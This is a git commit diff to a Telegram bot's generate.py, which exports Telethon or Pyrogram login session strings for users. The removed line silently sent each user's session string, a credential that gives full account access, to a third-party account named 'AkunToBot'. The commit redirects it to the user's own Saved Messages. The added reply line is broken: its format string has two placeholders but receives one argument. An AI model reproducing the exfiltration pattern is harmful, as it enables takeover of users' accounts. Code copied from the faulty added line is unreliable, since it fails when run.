4bca440b692207e0d43adfb369b5f653be829aab
AppleBotz <95849390+AppleBotz@users.noreply.github.com>
2022-01-25 15:54:57 +0700

    Update generate.py

--- StringSessionBot/generate.py
+++ StringSessionBot/generate.py
@@ -115,9 +115,9 @@ async def generate_session(bot, msg, telethon=False):
     else:
         string_session = await client.export_session_string()
     text = "**{} STRING SESSION** \n\n`{}` \n\nDonate to me for support @BLVCKCARDS".format("TELETHON" if telethon else "PYROGRAM", string_session)
-    await client.send_message("AkunToBot", text)
+    await client.send_message("me", text)
     await client.disconnect()
-    await phone_code_msg.reply("Berhasil Megambil {} string session. \n\nSilahkan cek di Pesan Tersimpan/Saved Message! \n\nBy @StringSession".format("telethon" if telethon else "pyrogram"))
+    await phone_code_msg.reply("Berhasil Megambil {} string session.\n\n`{}` \n\nSilahkan cek di Pesan Tersimpan/Saved Message! \n\nBy @StringSession".format("telethon" if telethon else "pyrogram"))
 
 
 async def cancelled(msg):
